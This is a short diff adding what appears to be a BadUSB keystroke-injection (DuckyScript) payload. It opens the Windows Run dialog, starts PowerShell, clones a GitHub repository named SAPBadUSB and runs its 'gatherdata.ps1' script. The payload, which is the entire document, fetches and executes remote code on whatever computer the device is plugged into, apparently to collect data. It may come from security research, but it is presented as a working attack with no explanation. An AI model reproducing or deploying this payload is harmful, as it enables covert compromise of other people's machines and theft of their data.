@@ -1,0 +1,7 @@
+REM *** Start powershell ***
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -NoExit -command "git clone https://github.com/JonathanStross/SAPBadUSB; cd .\SAPBadUSB\ps; .\gatherdata.ps1"
+DELAY 1000
+ENTER
